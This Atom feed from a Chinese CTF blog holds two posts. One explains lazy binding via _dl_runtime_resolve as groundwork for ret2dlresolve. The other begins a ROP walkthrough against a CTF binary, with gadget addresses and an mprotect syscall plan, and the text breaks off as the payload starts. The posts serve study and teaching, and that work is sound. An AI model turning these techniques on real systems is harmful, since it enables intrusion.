<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Junay的博客</title>
  <icon>https://www.gravatar.com/avatar/668c542d4e2eccc2ebe8815d4f4cd2db</icon>
  <subtitle>Junay&#39; Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-05T13:08:45.838Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Junay</name>
    <email>jay80@protonmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>got/plt之_dl_runtime_resolve</title>
    <link href="http://yoursite.com/2018/12/dl_runtime_resolve/"/>
    <id>http://yoursite.com/2018/12/dl_runtime_resolve/</id>
    <published>2018-12-05T13:03:56.000Z</published>
    <updated>2018-12-05T13:08:45.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;在<a href="https://delcoding.github.io/2018/11/got-plt-study/" target="_blank" rel="noopener">上篇文章</a>中，已经简单介绍了plt/got表的基本知识，但没有深入下去，这篇文章将继续理解动态链接的<code>实现</code>过程，同时也是<code>ret2dlresolve</code>基础知识。<br><a id="more"></a></p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><p>&emsp;&emsp;首先回顾下上篇的内容（主要是延迟绑定的概念）可以用下面这个GIF动图来概括：</p><div align="center"><br><img src="/images/posts/pwn/soogif.gif" alt="延迟绑定"><br></div><p>&emsp;&emsp;但这里还有很多没有说清楚的地方，就是<code>_dl_runtime_resolve</code>是怎么找到目标函数地址的，这也是这篇文章主要叙述的内容。</p><p>&emsp;&emsp;开始之前希望<code>先入</code>一些概念，以免在后面的名词上有疑惑。</p><ul><li><strong>.rel.plt</strong>：保存了重定位表信息，使用<code>Elf32_Rel</code>结构，包括了函数在<code>.got.plt</code>表中的偏移（在开了<code>pie</code>的情况下）或地址。</li><li><strong>.got.plt</strong>：保存了重定位地址。</li><li><strong>.dynsym</strong>：保存了符号的<code>Elf32_Sym</code>结构（包括符号名称的字符串），符号可代指函数或变量。</li></ul><p>&emsp;&emsp;<code>.rel.plt</code>跟<code>.got.plt</code>有什么区别呢，可以看下图：<br><img src="/images/posts/pwn/30.png" alt=""></p><p>&emsp;&emsp;<code>.rel.plt</code>是对函数引用的修正，它修正的位置位于<code>.got.plt</code>，也是函数重定位的入口，包含了更多的信息，如寻址方式，sym符号的地址（通过解析，后面会介绍到）等。</p><p>&emsp;&emsp;下面通过一个例子来说明。</p><p>&emsp;&emsp;首先看一下程序中包含的sections：<code>readelf -S demo</code><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1</span><br><span class="line">  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048340 000340 0001b2 00  AX  0   0 16</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里只截取了比较有价值的段。再看看重定位段：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r demo</span><br><span class="line"></span><br><span class="line">Relocation section <span class="hljs-string">'.rel.dyn'</span> at offset 0x2a8 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="hljs-string">'.rel.plt'</span> at offset 0x2b0 contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   <span class="hljs-built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;在sections中看到<code>.got.plt</code>的开始地址是<code>0x0804a000</code>，而在<code>.rel.plt</code>表的第一项是<code>0x0804a00c</code>，这是因为got.plt表的前三项是：</p><ul><li>got[0]: 本ELF动态段(<code>.dynamic</code>段）的装载地址 </li><li>got[1]：本ELF的<code>link_map</code>数据结构描述符地址 </li><li>got[2]：_dl_runtime_resolve函数的地址</li></ul><p>&emsp;&emsp;所以.rel.plt的第一项就是<code>0x0x0804a000 + 4*3 = 0x0804a00c</code>。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>&emsp;&emsp;这里我们跟踪<code>read</code>函数。<br><img src="/images/posts/pwn/31.png" alt=""></p><p>&emsp;&emsp;IDA里：<br><img src="/images/posts/pwn/32.png" alt=""></p><p>&emsp;&emsp;这里为什么是<code>push 0x0</code>？</p><p>&emsp;&emsp;这是因为<code>read</code>是在<code>.rel.plt</code>表中第一个字段，所以在索引时就是<code>.rel.plt-&gt;[0]</code>（逻辑上），这样就可以取出read的Elf32_Rel结构体。</p><p>&emsp;&emsp;怎么验证呢？使用<code>readelf -d demo</code>：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x80482c8</span><br><span class="line"> 0x0000000d (FINI)                       0x80484f4</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804822c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line"> 0x0000000a (STRSZ)                      80 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80482b0</span><br><span class="line"> 0x00000011 (REL)                        0x80482a8</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048288</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x804827c</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以看到有个<code>JMPREL</code>段，地址为<code>0x80482b0</code>跟前面看到的<code>[10] .rel.plt</code>一样，这个是<code>.rel.plt</code>的地址。查看偏移为0的地方：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="hljs-number">6</span>xw <span class="hljs-number">0x80482b0</span>+<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-number">0x80482b0</span>:<span class="hljs-number">0x0804a00c</span><span class="hljs-number">0x00000107</span><span class="hljs-number">0x0804a010</span><span class="hljs-number">0x00000207</span></span><br><span class="line"><span class="hljs-number">0x80482c0</span>:<span class="hljs-number">0x0804a014</span><span class="hljs-number">0x00000407</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;关于<code>Elf32_Rel</code>的结构如下：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;               <span class="hljs-comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;                 <span class="hljs-comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_SYM(val)                ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_TYPE(val)               ((val) &amp; 0xff)</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;0x0804a00c就是<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>的地址，同时也是<code>r_offset</code>， 0x00000107就是<code>r_info</code>。</p><p>&emsp;&emsp;再继续跟下去，就会得到如下：<br><img src="/images/posts/pwn/33.png" alt=""></p><p>&emsp;&emsp;就相当于调用了 <code>_dl_runtime_resolve((link_map *)m, 0)</code>，其中<code>link_map</code>提供了运行时的必要信息, 而<code>0</code>则是read函数在<code>.rel.plt</code>中的偏移。</p><p>&emsp;&emsp;<code>link_map</code>的数据结构是：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* </span></span><br><span class="line"><span class="hljs-comment">Structure describing a loaded shared object. </span></span><br><span class="line"><span class="hljs-comment">The `l_next' and `l_prev' members form a chain of all the shared objects loaded at startup. </span></span><br><span class="line"><span class="hljs-comment">These data structures exist in space used by the run-time dynamic linker; modifying them may have disastrous results. </span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span></span><br><span class="line"><span class="hljs-class">  &#123;</span></span><br><span class="line">    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger. This is the same format used in SVR4. */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;          <span class="hljs-comment">/* Difference between the address in the ELF file and the addresses in memory. */</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *l_name;               <span class="hljs-comment">/* Absolute file name object was found in. */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;            <span class="hljs-comment">/* Dynamic section of the shared object. */</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects. */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;进入到<code>_dl_runtime_resolve</code>的处理过程如下：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">        cfi_adjust_cfa_offset (<span class="hljs-number">8</span>)</span><br><span class="line">        pushl %eax                # Preserve registers otherwise clobbered.</span><br><span class="line">        cfi_adjust_cfa_offset (<span class="hljs-number">4</span>)</span><br><span class="line">        pushl %ecx</span><br><span class="line">        cfi_adjust_cfa_offset (<span class="hljs-number">4</span>)</span><br><span class="line">        pushl %edx</span><br><span class="line">        cfi_adjust_cfa_offset (<span class="hljs-number">4</span>)</span><br><span class="line">        movl <span class="hljs-number">16</span>(%esp), %edx        # Copy args pushed by PLT in <span class="hljs-keyword">register</span>.  Note</span><br><span class="line">        movl 12(%esp), %eax        # that `fixup' takes its parameters in regs.</span><br><span class="line">        call _dl_fixup                # Call resolver.</span><br><span class="line">        popl %edx                # Get <span class="hljs-keyword">register</span> content back.</span><br><span class="line">        cfi_adjust_cfa_offset (<span class="hljs-number">-4</span>)</span><br><span class="line">        movl (%esp), %ecx</span><br><span class="line">        movl %eax, (%esp)        # Store the function address.</span><br><span class="line">        movl <span class="hljs-number">4</span>(%esp), %eax</span><br><span class="line">        ret $<span class="hljs-number">12</span>                        # Jump to function address.</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;此时栈的状态如下：<br><img src="/images/posts/pwn/38.png" alt=""></p><p>&emsp;&emsp;在函数内部接着调用了<code>_dl_fixup</code>。其实现是：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// 函数声明，reloc_arg其实是我们 push 进来的 0x0</span></span><br><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">｛</span><br><span class="line"><span class="hljs-comment">// 得到 symtab 符号表</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-keyword">const</span> symtab </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="hljs-comment">// 取出 offset 在.rel.plt表中的Elf32_Rel数据结构</span></span><br><span class="line">    <span class="hljs-comment">// DT_JMPREL 就是 JMPREL .rel.plt 的起始地址</span></span><br><span class="line">    <span class="hljs-comment">// 以 read 为例，那么 reloc-&gt;r_offset = 0x0804a00c， reloc-&gt;r_info = 0x107</span></span><br><span class="line">    <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_arg);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// ELF_MACHINE_JMP_SLOT == R_386_JUMP_SLOT这是一种寻址方式，表示被修正的位置只需要填入符号的地址即可。</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="hljs-comment">// 下面单独解释</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);</span><br><span class="line">    <span class="hljs-comment">// 下面单独解释</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">//将已经解析完的函数地址写入相应的GOT表中</span></span><br><span class="line">    <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;讲解一：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>ElfW(Sym)</code>的数据结构是：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;                <span class="hljs-comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;               <span class="hljs-comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;                <span class="hljs-comment">/* Symbol size */</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other;               <span class="hljs-comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;               <span class="hljs-comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;找到<code>.dynsym</code>中对应的结构体。这里注意类型强制转换，定义在上面，以read为例：</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ELFW(R_SYM) (reloc-&gt;r_info) = <span class="hljs-number">0x107</span> &gt;&gt; <span class="hljs-number">8</span> = <span class="hljs-number">1</span>  <span class="hljs-comment">// 代表目标在.dynsym中的index</span></span><br><span class="line">ELFW(R_TYPE)(reloc-&gt;r_info) = <span class="hljs-number">0x107</span> &amp;&amp; <span class="hljs-number">0xff</span> = <span class="hljs-number">7</span>   <span class="hljs-comment">// 寻址方式</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;查看.dynsym，read确实是第1个：</p><div align="center"><br><img src="/images/posts/pwn/39.png" alt="注意看第一行"><br></div><p>&emsp;&emsp;相关参数如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804822c    // 字符串表</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc    // 符号表</span><br><span class="line">0x0000000a (STRSZ)                      80 (bytes)</span><br><span class="line">0x0000000b (SYMENT)                     16 (bytes)   // 符号长度</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;gdb中如下（*16是因为SYMENT）<br><img src="/images/posts/pwn/34.png" alt="ElfW(Sym)"></p><p>&emsp;&emsp;<code>_dl_lookup_symbol_x</code>根据<code>strtab+sym-&gt;st_name</code>在字符串表中找到函数名，然后进行符号查找获取libc基地址result。<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Search loaded objects' symbol tables for a definition of the symbol</span></span><br><span class="line"><span class="hljs-comment">   UNDEF_NAME, perhaps with a requested version for the symbol.*/</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;strtab + sym-&gt;st_name在gdb中如下：<br><img src="/images/posts/pwn/35.png" alt=""><br>&emsp;&emsp;这里读者可以按上述的数据结构翻译一下。</p><p>&emsp;&emsp;讲解二：<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// 将要解析的函数的偏移地址加上libc基址，就可以获取函数的实际地址</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;所以上面两条语句就类似于<code>pwntools</code>里查找<code>/bin/sh</code>一样（<code>next(libc.search(&#39;/bin/sh&#39;))</code>）。</p><p>&emsp;&emsp;以上就是<code>_dl_runtime_resolve/_dl_fixup</code>处理的细节。</p><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><img src="/images/posts/pwn/36.png" alt=""></p><p><img src="/images/posts/pwn/37.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.pppan.net/blog/detail/2018-04-09-about-got-plt" target="_blank" rel="noopener">https://www.pppan.net/blog/detail/2018-04-09-about-got-plt</a></li><li><a href="https://blog.csdn.net/linyt/article/details/51637832" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/51637832</a></li><li><a href="http://pwdme.cc/2017/09/26/lazy-binding-in-detail/" target="_blank" rel="noopener">http://pwdme.cc/2017/09/26/lazy-binding-in-detail/</a></li><li><a href="https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/</a></li><li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a></li><li><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a></li><li><a href="https://www.slideshare.net/AngelBoy1/re2dlresolve" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/re2dlresolve</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;在&lt;a href=&quot;https://delcoding.github.io/2018/11/got-plt-study/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;上篇文章&lt;/a&gt;中，已经简单介绍了plt/got表的基本知识，但没有深入下去，这篇文章将继续理解动态链接的&lt;code&gt;实现&lt;/code&gt;过程，同时也是&lt;code&gt;ret2dlresolve&lt;/code&gt;基础知识。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>x86 ROP study</title>
    <link href="http://yoursite.com/2018/12/rop-study/"/>
    <id>http://yoursite.com/2018/12/rop-study/</id>
    <published>2018-12-03T14:05:56.000Z</published>
    <updated>2018-12-04T05:44:56.465Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;通过两道ctf题学习<code>ROP</code>。<br><a id="more"></a></p><h3 id="DEMO1—-pop-ret"><a href="#DEMO1—-pop-ret" class="headerlink" title="DEMO1—(pop-ret)"></a>DEMO1—(pop-ret)</h3><p>&emsp;&emsp;首先overview，checksec得只开了NX：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在ida中也没看到链接<code>libc</code>，所以<code>ret2libc</code>行不通了。</p><div align="center"><br>    <img src="/images/posts/pwn/26.png"><br></div><p>&emsp;&emsp;栈不可执行又不能ret2libc，所以要考虑使用<code>ROP</code>来控制执行流，题目提示<code>mprotect</code>。</p><blockquote><p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p></blockquote><p>&emsp;&emsp;查看内存布局：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vm</span><br><span class="line">Start      End        PermName</span><br><span class="line">0x08048000 0x08049000 r-xp/mnt/hgfs/rop</span><br><span class="line">0xf7770000 0xf7773000 r--p[vvar]</span><br><span class="line">0xf7773000 0xf7774000 r-xp[vdso]</span><br><span class="line">0xff93b000 0xff95c000 rw-p[stack]</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再结合代码，发现我们无法找到栈的地址，所以也就不能给stack加可执行，但我们可以给<code>code段</code>加可写权限，而且因为没开<code>pie</code>，code地址是确定的，所以我们第一个目标就是用<code>mprotect</code>修改code段权限。它的声明如下：</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mprotect</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;需要指出的是，修改权限的内存区间（addr + len）必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址(能被0x1000整除)，并且区间长度len必须是页大小（0x1000）的整数倍。</p><p>&emsp;&emsp;mprotect要通过system call来执行，也就是<code>int 0x80</code>。调用号在x86中是<code>0x7d</code>，而在<code>x86-64</code>中是<code>10</code>。关于system调用的介绍如下：</p><div align="center"><br>    <img src="/images/posts/pwn/systemcall.png"><br></div><p>&emsp;&emsp;那么问题就来了，我们要合理的布置调用参数（eax,ebx,ecx,edx）。这时候<code>ROP</code>就上场了，使用<code>ROPgadget</code>查询下，得到：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804819c : pop eax ; ret</span><br><span class="line">0x0804819e : pop ebx ; ret</span><br><span class="line">0x080481a0 : pop ecx ; ret</span><br><span class="line">0x080481a2 : pop edx ; ret</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;那么我们就能控制寄存器了，完整的payload：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 